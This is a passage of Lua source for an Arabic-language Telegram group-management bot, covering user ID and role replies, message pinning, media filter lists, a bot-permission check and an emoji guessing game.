elseif (datahmade:get("SNIEBR:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and datahmade:get("SNIEBR:all_if:"..datahmade:get("SNIEBR:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
t = datahmade:get("SNIEBR:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
elseif is_owner(msg) then
t = datahmade:get("SNIEBR:name_own"..bot_id..msg.chat_id_) or 'مدير الكروب '   
elseif is_mod(msg) then
t = datahmade:get("SNIEBR:name_adm"..bot_id..msg.chat_id_) or 'ادمن الكروب'  
elseif is_vip(msg) then
t = datahmade:get("SNIEBR:name_vipp"..bot_id..msg.chat_id_) or ' عضو مميز '
else
t = datahmade:get("SNIEBR:name_nk"..bot_id..msg.chat_id_) or 'عضو فقط ' 
end
if not datahmade:get('SNIEBR:'..bot_id..'id:mute'..msg.chat_id_) then
if not datahmade:get('SNIEBR:'..bot_id..'id:photo'..msg.chat_id_) then
if not datahmade:get("SNIEBR:gr:id:text:"..bot_id..msg.chat_id_) then 
local keko_text = {
'صورتك فدشي 😘😔❤️  ',
"صارلك شكد مخليه 😐",
"وفالله 😔💘",
"كشخه برب 😉💘",
"دغيره شبي هذ 😒",
"عمري الحلوين 🙈💘",
}
keko3 = math.random(#keko_text)
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_,"🎥 ┇ "..keko_text[keko3].."\n🎟 ┇ ايديك • "..msg.sender_user_id_.."\n🎫 ┇ يوزرك •"..keko_info.."\n🛰 ┇ موقعك • "..t.."\n📖 ┇ رسائلك •("..user_msgs..")\n🗃 ┇ سحكاتك •("..edit..")\n📓 ┇ تفاعلك • ("..ikeko_text..")\n🤹🏻‍♂️ ┇ مجوهراتك • ("..nko..")\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ",msg.id_,msg.id_.."")
else 
local SNIEBR_new_text = datahmade:get("SNIEBR:gr:id:text:"..bot_id..msg.chat_id_)
local SNIEBR_new_text = SNIEBR_new_text:gsub('#username',(keko_info or 'لا يوجد'))
local SNIEBR_new_text = SNIEBR_new_text:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
local SNIEBR_new_text = SNIEBR_new_text:gsub('#edit',(edit or 'لا يوجد'))
local SNIEBR_new_text = SNIEBR_new_text:gsub('#msgs',(user_msgs or 'لا يوجد'))
local SNIEBR_new_text = SNIEBR_new_text:gsub('#stast',(t or 'لا يوجد'))
local SNIEBR_new_text = SNIEBR_new_text:gsub('#auto',(ikeko_text or 'لا يوجد'))
local SNIEBR_new_text = SNIEBR_new_text:gsub('#photos',(all_photo_SNIEBR or 'لا يوجد'))
local SNIEBR_new_text = SNIEBR_new_text:gsub('#game',(nko or 'لا يوجد'))

sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_,SNIEBR_new_text,msg.id_,msg.id_.."")
end
else
if msg.sender_user_id_ == tonumber(sudo_add) then
t = 'المطور الاساسي 👨🏻‍🔧'
elseif is_sudo(msg) then
t = datahmade:get("SNIEBR:name_sudo"..bot_id..msg.chat_id_)  or 'مطور البوت '
elseif is_creatorbasic(msg) then
t = datahmade:get("SNIEBR:name_cre"..bot_id..msg.chat_id_) or 'منشئ اساسي '
elseif (datahmade:get("SNIEBR:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and datahmade:get("SNIEBR:all_if:"..datahmade:get("SNIEBR:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
t = datahmade:get("SNIEBR:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
elseif is_creator(msg) then
t = datahmade:get("SNIEBR:name_cre"..bot_id..msg.chat_id_) or 'منشئ الكروب '
elseif (datahmade:get("SNIEBR:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and datahmade:get("SNIEBR:all_if:"..datahmade:get("SNIEBR:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
t = datahmade:get("SNIEBR:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
elseif is_owner(msg) then
t = datahmade:get("SNIEBR:name_own"..bot_id..msg.chat_id_) or 'مدير الكروب '
elseif is_mod(msg) then
t = datahmade:get("SNIEBR:name_adm"..bot_id..msg.chat_id_) or 'ادمن الكروب'
elseif is_vip(msg) then
t = datahmade:get("SNIEBR:name_vipp"..bot_id..msg.chat_id_) or ' عضو مميز '
else
t = datahmade:get("SNIEBR:name_nk"..bot_id..msg.chat_id_) or 'عضو فقط 👶🏻' 
end
if not datahmade:get("SNIEBR:gr:id:text:"..bot_id..msg.chat_id_) then 
send(msg.chat_id_, msg.id_, 1, "🎟 ┇ ايديك • ("..msg.sender_user_id_..")\n🎫 ┇ يوزرك •"..keko_info.."\n🛰 ┇ موقعك • "..t.."\n📖 ┇ رسائلك •("..user_msgs..")\n🗃 ┇ سحكاتك •("..edit..")\n📓 ┇ تفاعلك •"..ikeko_text.."\n🤹🏻‍♂️ ┇ مجوهراتك • ("..nko..")\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ ", 1, 'html')
else 
local SNIEBR_new_text = datahmade:get("SNIEBR:gr:id:text:"..bot_id..msg.chat_id_)
local SNIEBR_new_text = SNIEBR_new_text:gsub('#username',(keko_info or 'لا يوجد'))
local SNIEBR_new_text = SNIEBR_new_text:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
local SNIEBR_new_text = SNIEBR_new_text:gsub('#edit',(edit or 'لا يوجد'))
local SNIEBR_new_text = SNIEBR_new_text:gsub('#msgs',(user_msgs or 'لا يوجد'))
local SNIEBR_new_text = SNIEBR_new_text:gsub('#stast',(t or 'لا يوجد'))   
local SNIEBR_new_text = SNIEBR_new_text:gsub('#auto',(ikeko_text or 'لا يوجد'))
local SNIEBR_new_text = SNIEBR_new_text:gsub('#photos',(all_photo_SNIEBR or 'لا يوجد'))
local SNIEBR_new_text = SNIEBR_new_text:gsub('#game',(nko or 'لا يوجد'))

send(msg.chat_id_, msg.id_, 1, SNIEBR_new_text, 1, 'html')
end   
end
else
end
else
if msg.sender_user_id_ == tonumber(sudo_add) then
t = 'المطور الاساسي 👨🏻‍🔧'
elseif is_sudo(msg) then
t = datahmade:get("SNIEBR:name_sudo"..bot_id..msg.chat_id_)  or 'مطور البوت '
elseif is_creatorbasic(msg) then
t = datahmade:get("SNIEBR:name_cre"..bot_id..msg.chat_id_) or 'منشئ اساسي '
elseif (datahmade:get("SNIEBR:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and datahmade:get("SNIEBR:all_if:"..datahmade:get("SNIEBR:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
t = datahmade:get("SNIEBR:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
elseif is_creator(msg) then
t = datahmade:get("SNIEBR:name_cre"..bot_id..msg.chat_id_) or 'منشئ الكروب'
elseif (datahmade:get("SNIEBR:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and datahmade:get("SNIEBR:all_if:"..datahmade:get("SNIEBR:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
t = datahmade:get("SNIEBR:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
elseif is_owner(msg) then
t = datahmade:get("SNIEBR:name_own"..bot_id..msg.chat_id_) or 'مدير الكروب '
elseif is_mod(msg) then
t = datahmade:get("SNIEBR:name_adm"..bot_id..msg.chat_id_) or 'ادمن الكروب'
elseif is_vip(msg) then
t = datahmade:get("SNIEBR:name_vipp"..bot_id..msg.chat_id_) or ' عضو مميز '
else
t = datahmade:get("SNIEBR:name_nk"..bot_id..msg.chat_id_) or 'عضو فقط ' 
end
if not datahmade:get('SNIEBR:'..bot_id..'id:mute'..msg.chat_id_) then
if not datahmade:get('SNIEBR:'..bot_id..'id:photo'..msg.chat_id_) then
if not datahmade:get("SNIEBR:gr:id:text:"..bot_id..msg.chat_id_) then 
send(msg.chat_id_, msg.id_, 1, "🎟 ┇ ايديك • ("..msg.sender_user_id_..")\n🎫 ┇ يوزرك • "..keko_info.."\n🛰 ┇ موقعك •"..t.."\n📖 ┇ رسائلك •("..user_msgs..")\n🗃 ┇ سحكاتك • ("..edit..")\n📓 ┇ تفاعلك • "..ikeko_text.."\n🤹🏻‍♂️ ┇ مجوهراتك •  ("..nko..")\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ ", 1, 'html')
else 
local SNIEBR_new_text = datahmade:get("SNIEBR:gr:id:text:"..bot_id..msg.chat_id_)
local SNIEBR_new_text = SNIEBR_new_text:gsub('#username',(keko_info or 'لا يوجد'))
local SNIEBR_new_text = SNIEBR_new_text:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
local SNIEBR_new_text = SNIEBR_new_text:gsub('#edit',(edit or 'لا يوجد'))
local SNIEBR_new_text = SNIEBR_new_text:gsub('#msgs',(user_msgs or 'لا يوجد'))
local SNIEBR_new_text = SNIEBR_new_text:gsub('#stast',(t or 'لا يوجد'))   
local SNIEBR_new_text = SNIEBR_new_text:gsub('#auto',(ikeko_text or 'لا يوجد'))
local SNIEBR_new_text = SNIEBR_new_text:gsub('#photos',(all_photo_SNIEBR or 'لا يوجد'))
local SNIEBR_new_text = SNIEBR_new_text:gsub('#game',(nko or 'لا يوجد'))

send(msg.chat_id_, msg.id_, 1, SNIEBR_new_text, 1, 'html')
end
else
if msg.sender_user_id_ == tonumber(sudo_add) then
t = 'المطور الاساسي 👨🏻‍🔧'
elseif is_sudo(msg) then
t = datahmade:get("SNIEBR:name_sudo"..bot_id..msg.chat_id_)  or 'مطور البوت '
elseif is_creatorbasic(msg) then
t = datahmade:get("SNIEBR:name_cre"..bot_id..msg.chat_id_) or 'منشئ اساسي '
elseif (datahmade:get("SNIEBR:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and datahmade:get("SNIEBR:all_if:"..datahmade:get("SNIEBR:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
t = datahmade:get("SNIEBR:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
elseif is_creator(msg) then
t = datahmade:get("SNIEBR:name_cre"..bot_id..msg.chat_id_) or 'منشئ الكروب '
elseif (datahmade:get("SNIEBR:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and datahmade:get("SNIEBR:all_if:"..datahmade:get("SNIEBR:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
t = datahmade:get("SNIEBR:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
elseif is_owner(msg) then
t = datahmade:get("SNIEBR:name_own"..bot_id..msg.chat_id_) or 'مدير الكروب '
elseif is_mod(msg) then
t = datahmade:get("SNIEBR:name_adm"..bot_id..msg.chat_id_) or 'ادمن الكروب'
elseif is_vip(msg) then
t = datahmade:get("SNIEBR:name_vipp"..bot_id..msg.chat_id_) or ' عضو مميز '
else
t = datahmade:get("SNIEBR:name_nk"..bot_id..msg.chat_id_) or 'عضو فقط ' 
end
if not datahmade:get("SNIEBR:gr:id:text:"..bot_id..msg.chat_id_) then 
send(msg.chat_id_, msg.id_, 1,"🎥 ┇ انت لا تملك صوره لحسابك !\n🎟 ┇ ايديك • "..msg.sender_user_id_.."\n🎫 ┇ يوزرك • "..keko_info.."\n🛰 ┇ موقعك •  "..t.."\n📖 ┇ رسائلك • ("..user_msgs..")\n🗃 ┇ سحكاتك •("..edit..")\n📓 ┇ تفاعلك •"..ikeko_text.."\n??🏻‍♂️ ┇ مجوهراتك • ("..nko..")\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ", 1, 'html')
else 
local SNIEBR_new_text = datahmade:get("SNIEBR:gr:id:text:"..bot_id..msg.chat_id_)
local SNIEBR_new_text = SNIEBR_new_text:gsub('#username',(keko_info or 'لا يوجد'))
local SNIEBR_new_text = SNIEBR_new_text:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
local SNIEBR_new_text = SNIEBR_new_text:gsub('#edit',(edit or 'لا يوجد'))
local SNIEBR_new_text = SNIEBR_new_text:gsub('#msgs',(user_msgs or 'لا يوجد'))
local SNIEBR_new_text = SNIEBR_new_text:gsub('#stast',(t or 'لا يوجد'))   
local SNIEBR_new_text = SNIEBR_new_text:gsub('#auto',(ikeko_text or 'لا يوجد'))
local SNIEBR_new_text = SNIEBR_new_text:gsub('#photos',(all_photo_SNIEBR or 'لا يوجد'))
local SNIEBR_new_text = SNIEBR_new_text:gsub('#game',(nko or 'لا يوجد'))

send(msg.chat_id_, msg.id_, 1, SNIEBR_new_text, 1, 'html')  
end 
end
else
end
end
end
tdcli_function ({
ID = "GetUserProfilePhotos",
user_id_ = msg.sender_user_id_,
offset_ = 0,
limit_ = 1
}, getpro, nil)
end
getUser(msg.sender_user_id_, keko333)
end
end
if text then
if datahmade:sismember('SNIEBR:'..bot_id..'spam:id'..msg.sender_user_id_..':'..msg.chat_id_,text) then
else
datahmade:del('SNIEBR:'..bot_id..'spam:id'..msg.sender_user_id_..':'..msg.chat_id_) 
end
end
if text:match('^الحساب (%d+)$') then
local id = text:match('^الحساب (%d+)$')
local text = 'اضغط لمشاهده الحساب'
tdcli_function ({ID="SendMessage", chat_id_=msg.chat_id_, reply_to_message_id_=msg.id_, disable_notification_=0, from_background_=1, reply_markup_=nil, input_message_content_={ID="InputMessageText", text_=text, disable_web_page_preview_=1, clear_draft_=0, entities_={[0] = {ID="MessageEntityMentionName", offset_=0, length_=19, user_id_=id}}}}, dl_cb, nil)
end
local function oChat(chat_id,cb)
tdcli_function ({
ID = "OpenChat",
chat_id_ = chat_id
}, cb, nil)
end
if text:match("^معلومات (.*)$") then
local memb = {string.match(text, "^(معلومات) (.*)$")}
function whois(extra,result,success)
if result.username_ then
result.username_ = '@'..result.username_
else
result.username_ = 'لا يوجد معرف'
end
send(msg.chat_id_, msg.id_, 1, '📜┇معرف ~⪼ ('..(result.username_..')\n🔘┇الاسم ~⪼ ('..result.first_name_ or "SNIEBR")..')', 1, 'md')
end
getUser(memb[2],whois)
end
if (text and text == 'تفعيل التثبيت') and (is_owner(msg) or is_creatorbasic(msg)) then
if not datahmade:get('SNIEBR:'..bot_id..'pin:mute'..msg.chat_id_) then
send(msg.chat_id_, msg.id_, 1, '☑┇التثبيت بالفعل تم تفعيله', 1, 'md')
else
send(msg.chat_id_, msg.id_, 1, '☑┇تم تفعيل التثبيت', 1, 'md')
datahmade:del('SNIEBR:'..bot_id..'pin:mute'..msg.chat_id_)
end
end
if (text and text == 'تعطيل التثبيت') and (is_owner(msg) or is_creatorbasic(msg)) then
if datahmade:get('SNIEBR:'..bot_id..'pin:mute'..msg.chat_id_) then
send(msg.chat_id_, msg.id_, 1, '☑┇التثبيت بالفعل تم تعطيله', 1, 'md')
else
send(msg.chat_id_, msg.id_, 1, '☑┇تم تعطيل التثبيت', 1, 'md')
datahmade:set('SNIEBR:'..bot_id..'pin:mute'..msg.chat_id_,true)
end
end
if text:match("^تثبيت$") and (is_mod(msg) or is_creatorbasic(msg)) and not is_owner(msg) then
local id = msg.id_
local msgs = {[0] = id}
if not datahmade:get('SNIEBR:'..bot_id..'pin:mute'..msg.chat_id_) then
pin(msg.chat_id_,msg.reply_to_message_id_,0)
datahmade:set('SNIEBR:'..bot_id..'pinnedmsg'..msg.chat_id_,msg.reply_to_message_id_)
send(msg.chat_id_, msg.id_, 1, '⚜️┇ تم تثبيت الرسالة  ',1, 'md')
return false
else
send(msg.chat_id_, msg.id_, 1, '☑┇التثبيت معطل',1, 'md')
end
end
if text:match("^الغاء تثبيت$") and (is_mod(msg) or is_creatorbasic(msg)) and not is_owner(msg) or text:match("^الغاء التثبيت") and (is_mod(msg) or is_creatorbasic(msg)) and not is_owner(msg) then
if not datahmade:get('SNIEBR:'..bot_id..'pin:mute'..msg.chat_id_) then
unpinmsg(msg.chat_id_)
send(msg.chat_id_, msg.id_, 1, '☑┇تم الغاء تثبيت الرساله', 1, 'md')
else
send(msg.chat_id_, msg.id_, 1, '☑┇الغاء التثبيت معطل', 1, 'md')
end
end
if text:match("^تثبيت$") and (is_owner(msg) or is_creatorbasic(msg)) then
local id = msg.id_
local msgs = {[0] = id}
pin(msg.chat_id_,msg.reply_to_message_id_,0)
datahmade:set('SNIEBR:'..bot_id..'pinnedmsg'..msg.chat_id_,msg.reply_to_message_id_)
send(msg.chat_id_, msg.id_, 1, '⚜️┇ تم تثبيت الرسالة  ',1, 'md')
end
if text:match("^الغاء تثبيت$") and (is_owner(msg) or is_creatorbasic(msg)) or text:match("^الغاء التثبيت") and (is_owner(msg) or is_creatorbasic(msg)) then
unpinmsg(msg.chat_id_)
send(msg.chat_id_, msg.id_, 1, '☑┇تم الغاء تثبيت الرساله', 1, 'md')
end
if text:match("^مشاهده منشور$") then
datahmade:set('SNIEBR:'..bot_id..'viewget'..msg.sender_user_id_,true)
send(msg.chat_id_, msg.id_, 1, '📥┇قم بارسال المنشور الان ',1, 'md')
end
if (text and text == 'استعاده الاوامر') and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
redis:del('SNIEBR:'..bot_id..'help', text)
redis:del('SNIEBR:'..bot_id..'h1', text)
redis:del('SNIEBR:'..bot_id..'h2', text)
redis:del('SNIEBR:'..bot_id..'h3', text)
redis:del('SNIEBR:'..bot_id..'h4', text)
redis:del('SNIEBR:'..bot_id..'h5', text)
redis:del('SNIEBR:'..bot_id..'h6', text)
send(msg.chat_id_, msg.id_, 1, '☑┇تم استعاده جميع كلايش الاوامر', 1, 'html')
end
if (text and text == 'تغير امر الاوامر') and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
send(msg.chat_id_, msg.id_, 1, '📥┇الان يمكنك ارسال الكليشه  ليتم حفظها', 1, 'html')
redis:set('SNIEBR:'..bot_id..'hhh'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local keko2 = redis:get('SNIEBR:'..bot_id..'hhh'..msg.sender_user_id_..'')
if keko2 == 'msg' then
send(msg.chat_id_, msg.id_, 1, '☑┇تم حفظ الكليشه يمكنك اظهارها بارسال الامر', 1, 'html')
redis:set('SNIEBR:'..bot_id..'hhh'..msg.sender_user_id_..'', 'no')
redis:set('SNIEBR:'..bot_id..'help', text)
send(msg.chat_id_, msg.id_, 1, text , 1, 'html')
return false end
end
---------------
if text == "صلاحياته" and tonumber(msg.reply_to_message_id_) > 0 then    
if tonumber(msg.reply_to_message_id_) ~= 0 then 
function prom_reply(extra, result, success) 
Get_Info(msg,msg.chat_id_,result.sender_user_id_)
end  
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},prom_reply, nil)
end
end
if text == "صلاحياتي" then 
if tonumber(msg.reply_to_message_id_) == 0 then 
Get_Info(msg,msg.chat_id_,msg.sender_user_id_)
end  
end
if text and text:match('^صلاحياته @(.*)') then   
local username = text:match('صلاحياته @(.*)')   
if tonumber(msg.reply_to_message_id_) == 0 then 
function prom_username(extra, result, success) 
if (result and result.code_ == 400 or result and result.message_ == "USERNAME_NOT_OCCUPIED") then
SendText(msg.chat_id_,msg.id_,"*📮┇ المعرف غير صحيح \n*")   
return false  end   
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
SendText(msg.chat_id_,msg.id_,"*📮┇ هاذا معرف قناة \n*")   
return false end      
Get_Info(msg,msg.chat_id_,result.id_)
end  
tdcli_function ({ID = "SearchPublicChat",username_ = username},prom_username,nil) 
end 
end
if text == 'فحص البوت' and (is_creator(msg) or is_creatorbasic(msg)) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. msg.chat_id_ ..'&user_id='.. bot_id..'')
local Json_Info = JSON.decode(Chek_Info)
vardump(Json_Info)
if Json_Info.ok == true then
if Json_Info.result.status == "administrator" then
if Json_Info.result.can_change_info == true then
info = ' ✓' else info = '✘' end
if Json_Info.result.can_delete_messages == true then
delete = ' ✓' else delete = '✘' end
if Json_Info.result.can_invite_users == true then
invite = ' ✓' else invite = '✘' end
if Json_Info.result.can_pin_messages == true then
pin = ' ✓' else pin = '✘' end
if Json_Info.result.can_restrict_members == true then
restrict = ' ✓' else restrict = '✘' end
if Json_Info.result.can_promote_members == true then
promote = ' ✓' else promote = '✘' end 
SendText(msg.chat_id_,msg.id_,'\n📌┇ اهلا عزيزي البوت هنا ادمن'..'\n💢┇ وصلاحياته هي ↓ \nٴ━━━━━━━━━━'..'\n📝┇ تغير معلومات المجموعه ↞ ❴ '..info..' ❵'..'\n📨┇ حذف الرسائل ↞ ❴ '..delete..' ❵'..'\n🚷┇ حظر المستخدمين ↞ ❴ '..restrict..' ❵'..'\n♻┇ دعوة مستخدمين ↞ ❴ '..invite..' ❵'..'\n🔘┇ تثبيت الرسائل ↞ ❴ '..pin..' ❵'..'\n🚸┇ اضافة مشرفين جدد ↞ ❴ '..promote..' ❵')   
end
end
end
if text == 'منع' and tonumber(msg.reply_to_message_id_) > 0 and is_owner(msg) then 
function cb(a,b,c) 
textt = '📮┇ تم منع '
if b.content_.sticker_ then
local idsticker = b.content_.sticker_.set_id_
datahmade:sadd('SNIEBR:'..bot_id.."filtersteckr"..msg.chat_id_,idsticker)
text = 'الملصق'
sendtext(msg.chat_id_, msg.id_,textt..'( '..text..' ) بنجاح لن يتم ارسالها مجددا')  
return false
end
if b.content_.ID == "MessagePhoto" then
local photo = b.content_.photo_.id_
datahmade:sadd('SNIEBR:'..bot_id.."filterphoto"..msg.chat_id_,photo)
text = 'الصوره'
sendtext(msg.chat_id_, msg.id_,textt..'( '..text..' ) بنجاح لن يتم ارسالها مجددا')  
return false
end
if b.content_.animation_.animation_ then
local idanimation = b.content_.animation_.animation_.persistent_id_
datahmade:sadd('SNIEBR:'..bot_id.."filteranimation"..msg.chat_id_,idanimation)
text = 'المتحركه'
sendtext(msg.chat_id_, msg.id_,textt..'( '..text..' ) بنجاح لن يتم ارسالها مجددا')  
return false
end
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),cb) 
end
if text == 'الغاء منع' and tonumber(msg.reply_to_message_id_) > 0 and is_owner(msg) then 
function cb(a,b,c) 
textt = '📮┇ تم الغاء منع '
if b.content_.sticker_ then
local idsticker = b.content_.sticker_.set_id_
datahmade:srem('SNIEBR:'..bot_id.."filtersteckr"..msg.chat_id_,idsticker)
text = 'الملصق'
sendtext(msg.chat_id_, msg.id_,textt..'( '..text..' ) بنجاح يمكنهم الارسال الان')  
return false
end
if b.content_.ID == "MessagePhoto" then
local photo = b.content_.photo_.id_
datahmade:srem('SNIEBR:'..bot_id.."filterphoto"..msg.chat_id_,photo)
text = 'الصوره'
sendtext(msg.chat_id_, msg.id_,textt..'( '..text..' ) بنجاح يمكنهم الارسال الان')  
return false
end
if b.content_.animation_.animation_ then
local idanimation = b.content_.animation_.animation_.persistent_id_
datahmade:srem('SNIEBR:'..bot_id.."filteranimation"..msg.chat_id_,idanimation)
text = 'المتحركه'
sendtext(msg.chat_id_, msg.id_,textt..'( '..text..' ) بنجاح يمكنهم الارسال الان')  
return false
end
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),cb) 
end
if text == 'مسح قائمه منع المتحركات' and is_owner(msg) then 
datahmade:del('SNIEBR:'..bot_id.."filteranimation"..msg.chat_id_)
sendtext(msg.chat_id_, msg.id_,'🔖┇ تم مسح قائمه منع المتحركات')  
end
if text == 'مسح قائمه منع الصور' and is_owner(msg) then 
datahmade:del('SNIEBR:'..bot_id.."filterphoto"..msg.chat_id_)
sendtext(msg.chat_id_, msg.id_,'🔖┇ تم مسح قائمه منع الصور')  
end
if text == 'مسح قائمه منع الملصقات' and is_owner(msg) then 
datahmade:del('SNIEBR:'..bot_id.."filtersteckr"..msg.chat_id_)
sendtext(msg.chat_id_, msg.id_,'🔖┇ تم مسح قائمه منع الملصقات')  
end

---------------
if text == 'سمايلات' and datahmade:get('SNIEBR:'..bot_id..'lock_geam'..msg.chat_id_) then
datahmade:del('SNIEBR:'..bot_id..'l:ids'..msg.chat_id_)
katu = {'🍏','🍎','🍐','🍊','🍋','🍌','🍉','🍇','🍓','🍈','🍒','🍑','🍍','🥥','🥝','🍅','🍆','🥑','🥦','🥒','🌶','🌽','🥕','🥔','??','🥐','🍞','??','🥨','🧀','🥚','🍳','🥞','🥓','🥩','🍗','🍖','🌭','🍔','??','🍕','🥪','🥙','🍼','☕️','🍵','🥤','🍶','🍺','🍻','🏀','⚽️','🏈','⚾️','🎾','🏐','🏉','🎱','🏓','🏸','🥅','🎰','🎮','🎳','🎯','🎲','🎻','🎸','🎺','🥁','🎹','🎼','🎧','🎤','🎬','🎨','🎭','🎪','🎟','🎫','🎗','🏵','🎖','🏆','🥌','🛷','🚕','🚗','🚙','🚌','🚎','🏎','🚓','🚑','🚚','🚛','🚜','🇮🇶','⚔','🛡','🔮','🌡','💣','📌','📍','📓','📗','📂','📅','📪','📫','📬','📭','⏰','📺','🎚','☎️','📡'}
name = katu[math.random(#katu)]
datahmade:set('SNIEBR:'..bot_id..'klmos'..msg.chat_id_,name)
name = string.gsub(name,'🍞','🍞')
name = string.gsub(name,'🥖','🥖')
name = string.gsub(name,'🥨','🥨')
name = string.gsub(name,'🧀','🧀')
name = string.gsub(name,'🥚','🥚')
name = string.gsub(name,'🍳','🍳')
name = string.gsub(name,'🥞','🥞')
name = string.gsub(name,'🥓','🥓')
name = string.gsub(name,'🥩','🥩')
name = string.gsub(name,'🍗','🍗')
name = string.gsub(name,'🍖','🍖')
name = string.gsub(name,'🌭','🌭')
name = string.gsub(name,'🍔','🍔')
name = string.gsub(name,'🍟','🍟')
name = string.gsub(name,'🍕','🍕')
name = string.gsub(name,'🥪','🥪')
name = string.gsub(name,'🥙','🥙')
name = string.gsub(name,'🍼','🍼')
name = string.gsub(name,'☕️','☕️')
name = string.gsub(name,'🍵','🍵')
name = string.gsub(name,'🥤','🥤')
name = string.gsub(name,'🍶','🍶')
name = string.gsub(name,'🍺','🍺')
name = string.gsub(name,'🍏','🍏')
name = string.gsub(name,'🍎','🍎')
name = string.gsub(name,'🍐','🍐')
name = string.gsub(name,'🍊','🍊')
name = string.gsub(name,'🍋','🍋')
name = string.gsub(name,'🍌','🍌')
name = string.gsub(name,'🍉','🍉')
name = string.gsub(name,'🍇','🍇')
name = string.gsub(name,'🍓','🍓')
name = string.gsub(name,'🍈','🍈')
name = string.gsub(name,'🍒','🍒')
name = string.gsub(name,'🍑','🍑')
name = string.gsub(name,'🍍','🍍')
name = string.gsub(name,'🥥','🥥')
name = string.gsub(name,'🥝','🥝')
name = string.gsub(name,'🍅','🍅')
name = string.gsub(name,'🍆','🍆')
name = string.gsub(name,'🥑','🥑')
name = string.gsub(name,'🥦','🥦')
name = string.gsub(name,'🥒','🥒')
name = string.gsub(name,'🌶','🌶')
name = string.gsub(name,'🌽','🌽')
name = string.gsub(name,'🥕','🥕')
name = string.gsub(name,'🥔','🥔')
name = string.gsub(name,'🍠','🍠')
name = string.gsub(name,'🥐','🥐')
name = string.gsub(name,'🍻','🍻')
name = string.gsub(name,'🏀','🏀')
name = string.gsub(name,'⚽️','⚽️')
name = string.gsub(name,'🏈','🏈')
name = string.gsub(name,'⚾️','⚾️')
name = string.gsub(name,'🎾','🎾')
name = string.gsub(name,'🏐','🏐')
name = string.gsub(name,'🏉','🏉')
name = string.gsub(name,'🎱','🎱')
name = string.gsub(name,'🏓','🏓')
name = string.gsub(name,'🏸','🏸')
name = string.gsub(name,'🥅','🥅')
name = string.gsub(name,'🎰','🎰')
name = string.gsub(name,'🎮','🎮')
name = string.gsub(name,'🎳','🎳')
name = string.gsub(name,'🎯','🎯')
name = string.gsub(name,'🎲','🎲')
name = string.gsub(name,'🎻','🎻')
name = string.gsub(name,'🎸','🎸')
name = string.gsub(name,'🎺','🎺')
name = string.gsub(name,'🥁','🥁')
name = string.gsub(name,'🎹','🎹')
name = string.gsub(name,'🎼','🎼')
name = string.gsub(name,'🎧','🎧')
name = string.gsub(name,'🎤','🎤')
name = string.gsub(name,'🎬','🎬')
name = string.gsub(name,'🎨','🎨')
name = string.gsub(name,'🎭','🎭')
name = string.gsub(name,'🎪','🎪')
name = string.gsub(name,'🎟','🎟')
name = string.gsub(name,'🎫','🎫')
name = string.gsub(name,'🎗','🎗')
name = string.gsub(name,'🏵','🏵')
name = string.gsub(name,'🎖','🎖')
name = string.gsub(name,'🏆','🏆')
name = string.gsub(name,'🥌','🥌')
name = string.gsub(name,'🛷','🛷')
name = string.gsub(name,'🚕','🚕')
name = string.gsub(name,'🚗','🚗')
name = string.gsub(name,'🚙','🚙')
name = string.gsub(name,'🚌','🚌')
name = string.gsub(name,'🚎','🚎')
name = string.gsub(name,'🏎','🏎')
name = string.gsub(name,'🚓','🚓')
name = string.gsub(name,'🚑','🚑')
name = string.gsub(name,'🚚','🚚')
name = string.gsub(name,'🚛','🚛')
name = string.gsub(name,'🚜','🚜')
name = string.gsub(name,'🇮🇶','🇮🇶')
name = string.gsub(name,'⚔','⚔')
name = string.gsub(name,'🛡','🛡')
name = string.gsub(name,'🔮','🔮')
name = string.gsub(name,'🌡','🌡')
name = string.gsub(name,'💣','💣')
name = string.gsub(name,'📌','📌')
name = string.gsub(name,'📍','📍')
name = string.gsub(name,'📓','📒')
name = string.gsub(name,'📗','📗')
name = string.gsub(name,'📂','🗂')
name = string.gsub(name,'📅','📆')
